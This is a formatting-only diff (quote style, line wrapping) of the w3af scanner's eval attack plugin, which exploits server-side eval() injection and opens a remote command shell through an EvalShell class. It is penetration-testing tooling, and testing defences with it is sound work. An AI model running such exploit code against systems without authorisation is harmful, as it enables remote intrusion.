@@ -19,6 +19,7 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 """
+
 import w3af.core.controllers.output_manager as om
 import w3af.plugins.attack.payloads.shell_handler as shell_handler
 
@@ -45,7 +46,7 @@ class eval(AttackPlugin):
         """
         :return: The type of exploit, SHELL, PROXY, etc.
         """
-        return 'shell'
+        return "shell"
 
     def get_kb_location(self):
         """
@@ -58,7 +59,7 @@ class eval(AttackPlugin):
         Then the exploit plugin that exploits os_commanding
         ( attack.os_commanding ) should return 'os_commanding' in this method.
         """
-        return ['eval']
+        return ["eval"]
 
     def _generate_shell(self, vuln_obj):
         """
@@ -68,8 +69,9 @@ class eval(AttackPlugin):
         # Check if we really can execute commands on the remote server
         if self._verify_vuln(vuln_obj):
             # Create the shell object
-            shell_obj = EvalShell(vuln_obj, self._uri_opener, self.worker_pool,
-                                  self._shellcode_generator)
+            shell_obj = EvalShell(
+                vuln_obj, self._uri_opener, self.worker_pool, self._shellcode_generator
+            )
             return shell_obj
         else:
             return None
@@ -85,7 +87,7 @@ class eval(AttackPlugin):
         extension = vuln_obj.get_url().get_extension()
 
         # I get a list of tuples with code and extension to use
-        null_command = ''
+        null_command = ""
         shell_code_list = shell_handler.get_shell_code(extension, null_command)
 
         for code, real_extension, shellcode_generator in shell_code_list:
@@ -97,13 +99,17 @@ class eval(AttackPlugin):
             try:
                 http_res = self._uri_opener.send_mutant(mutant)
             except BaseFrameworkException as w3:
-                msg = 'An error occurred while trying to exploit the eval()'\
-                      ' vulnerability. Original exception: "%s".'
+                msg = (
+                    "An error occurred while trying to exploit the eval()"
+                    ' vulnerability. Original exception: "%s".'
+                )
                 om.out.debug(msg % w3)
             else:
                 if shell_handler.SHELL_IDENTIFIER in http_res.get_body():
-                    msg = 'Successfully exploited eval() vulnerability using'\
-                          ' the following code snippet: "%s...".' % code[:35]
+                    msg = (
+                        "Successfully exploited eval() vulnerability using"
+                        ' the following code snippet: "%s...".' % code[:35]
+                    )
                     om.out.debug(msg)
                     self._shellcode_generator = shellcode_generator
                     return True
@@ -135,9 +141,9 @@ class EvalShell(ExecShell):
 
     def __init__(self, vuln, uri_opener, worker_pool, shellcode_generator):
         super(EvalShell, self).__init__(vuln, uri_opener, worker_pool)
-        
+
         self.shellcode_generator = shellcode_generator
-        
+
     @exec_debug
     def execute(self, command):
         """
@@ -155,16 +161,18 @@ class EvalShell(ExecShell):
         try:
             response = self._uri_opener.send_mutant(mutant)
         except BaseFrameworkException as w3:
-            msg = 'An error occurred while trying to exploit the eval()'\
-                  ' vulnerability (sending command %s). Original exception:' \
-                  ' "%s".'
+            msg = (
+                "An error occurred while trying to exploit the eval()"
+                " vulnerability (sending command %s). Original exception:"
+                ' "%s".'
+            )
             om.out.debug(msg % (command, w3))
-            return 'Unexpected error, please try again.'
+            return "Unexpected error, please try again."
         else:
             return shell_handler.extract_result(response.get_body())
 
     def get_name(self):
-        return 'eval_shell'
+        return "eval_shell"
 
     def __reduce__(self):
         """
